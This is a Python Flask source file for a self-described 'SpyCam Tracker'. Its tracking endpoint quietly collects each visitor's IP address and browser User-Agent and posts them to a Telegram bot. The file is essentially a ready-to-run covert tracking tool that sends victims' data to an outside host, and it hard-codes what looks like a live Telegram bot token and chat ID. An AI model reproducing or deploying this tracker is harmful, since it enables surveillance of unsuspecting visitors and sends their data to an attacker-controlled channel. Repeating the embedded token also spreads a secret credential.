from flask import Flask, request
import requests

app = Flask(__name__)

# Telegram bot token and your chat_id
TOKEN = "7590817261:AAGL6vH2hi4NPd9x1Iikaqlk40p5xxQ0cBc"
CHAT_ID = "6908281054"  # Replace this with your actual Telegram chat ID

@app.route("/", methods=["GET"])
def index():
    return "💥 Faizan™ SpyCam Tracker v3.0 is Live"

@app.route("/track", methods=["POST"])
def track():
    data = request.json
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    message = f"""🔍 *New Visitor Tracked*
🌐 IP: `{ip}`
📱 Device: `{user_agent}`"""

    send_to_telegram(message)
    return {"status": "received"}

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
    requests.post(url, json=payload)

if __name__ == "__main__":
    app.run(debug=False)
